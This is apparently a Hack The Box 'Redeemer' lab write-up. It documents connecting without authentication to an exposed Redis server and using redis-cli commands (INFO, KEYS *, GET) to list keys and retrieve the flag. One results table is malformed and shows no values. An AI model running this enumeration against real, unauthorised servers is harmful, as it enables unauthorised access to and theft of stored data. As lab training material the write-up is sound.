# HTB Redeemer - Service Enumeration

## 1. Objective

The objective of this stage was to investigate the Redis service discovered during reconnaissance, identify its configuration, enumerate available databases and retrieve stored information.

## 2. Redis Client Installation

The Redis command-line utility was checked and installed if necessary.

Command executed:

```bash
sudo apt update && sudo apt install -y redis-tools
```

### Explanation

- `sudo`: Executes commands with administrative privileges.
- `apt update`: Refreshes the package repository information.
- `apt install`: Installs the requested package.
- `redis-tools`: Provides Redis command-line utilities, including `redis-cli`.

## 3. Connecting to Redis

Command executed:

```bash
redis-cli -h 10.129.114.226
```

### Explanation

- `redis-cli`: Launches the Redis command-line interface.
- `-h`: Specifies the remote host.
- `10.129.114.226`: Current Redeemer target IP.

### Observation

A Redis prompt appeared without requesting a password:

```text
10.129.114.226:6379>
```

This demonstrated that the Redis service permitted access without authentication in this lab environment.

## 4. Redis Server Information

Command executed:

```redis
INFO
```

### Important Results

| Parameter | Result |
|---|---|
| Redis Version | 5.0.7 |
| Redis Mode | Standalone |
| Operating System | Linux |
| Architecture | 64-bit |
| Role | Master |
| Cluster Enabled | 0 |
| Database 0 Keys | 4 |

### Explanation

The `INFO` command provides information about the Redis server, including its version, configuration, connected clients, memory usage and database statistics.

The Keyspace section revealed:

```text
db0:keys=4,expires=0,avg_ttl=0
```

This indicated that database 0 contained four keys.

## 5. Database Enumeration

### Listing Available Keys

Command executed:

```redis
KEYS *
```

### Results

```text
1) "stor"
2) "numb"
3) "flag"
4) "temp"
```

### Explanation

- `KEYS`: Searches for keys matching a specified pattern.
- `*`: Wildcard matching all keys.

Four keys were discovered in database 0.

## 6. Retrieving Stored Values

The Redis `GET` command was used to retrieve the values associated with each key.

### Commands Executed

```redis
GET stor
GET numb
GET flag
GET temp
```

### Results

| Key |
|---|---|
| stor |
| numb |
| flag |
| temp |

### Observation

All four values were returned successfully.

The values consisted of 32 hexadecimal characters each. Their appearance was consistent with MD5-formatted strings, although their encoding was not independently established.

## 7. Investigating the Flag Key

The following commands were executed:

### Selecting Database 0

```redis
SELECT 0
```

Result:

```text
OK
```

### Checking the Data Type

```redis
TYPE flag
```

Result:

```text
string
```

This confirmed that the flag key stored a Redis string.

### Checking the Expiration Time

```redis
TTL flag
```

Result:

```text
(integer) -1
```

This indicated that the key existed without an expiration time.

## 8. Enumeration Conclusion

The Redis service was successfully accessed without authentication in the controlled Hack The Box environment.

Four keys were discovered and their associated values were retrieved.

The key named `flag` contained the correct value required by the Redeemer challenge.

## 9. Next Stage

Proceed to documenting the security findings, potential impact and recommended remediation.